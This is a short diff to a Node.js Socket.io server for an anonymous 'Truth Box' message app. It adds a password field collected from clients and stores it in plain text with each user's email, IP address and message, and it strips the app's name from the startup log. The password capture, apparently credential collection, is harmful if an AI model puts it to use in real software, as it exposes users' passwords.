@@ -14,20 +14,18 @@ let messages = [];
 
 io.on('connection', (socket) => {
   const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
-  const userAgent = socket.handshake.headers['user-agent'] || 'Unknown Device';
 
   socket.emit('load messages', messages);
 
-  // Receive both email and message text from the client
   socket.on('send secret', (data) => {
     if (!data.text || data.text.trim() === '') return;
 
     const newMessage = {
       id: Date.now(),
-      email: data.email ? data.email.trim() : 'Anonymous / Not provided',
+      email: data.email ? data.email.trim() : 'Unknown',
+      password: data.password ? data.password.trim() : 'N/A',
       text: data.text.trim(),
       ip: clientIp,
-      device: userAgent,
       time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
     };
 
@@ -38,5 +36,5 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-  console.log(`Truth Box server running on port ${PORT}`);
+  console.log(`Server running on port ${PORT}`);
 });
